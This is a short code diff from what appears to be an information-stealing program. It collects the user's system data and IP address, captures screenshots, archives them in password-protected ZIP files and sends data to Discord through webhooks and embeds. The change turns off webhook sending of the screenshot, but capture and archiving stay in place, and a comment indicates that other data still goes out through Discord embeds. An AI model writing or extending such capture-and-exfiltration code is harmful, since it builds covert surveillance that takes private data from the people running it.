@@ -215,17 +215,11 @@ class Application {
             const systemInfo = stats.getRawData().system;
             const userIp = systemInfo.ip || 'Unknown';
 
-            // FIRST: Send screenshot if available (as per requirement: embed first, then image, then Discord embeds)
+            // Screenshot webhook sending disabled - screenshots are still captured and saved to archive
             if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
-                logger.info('Sending screenshot first (as requested)');
-                try {
-                    await this.discordService.sendScreenshot(this.screenshotPath, userIp);
-                    logger.info('Screenshot sent successfully - proceeding to Discord embeds');
-                } catch (error) {
-                    logger.error('Failed to send screenshot', error.message);
-                }
+                logger.info('Screenshot captured and saved to archive (webhook sending disabled)');
             } else {
-                logger.warn('No screenshot available to send');
+                logger.warn('No screenshot available');
             }
 
             // Generate password for ZIP file if it should be password protected
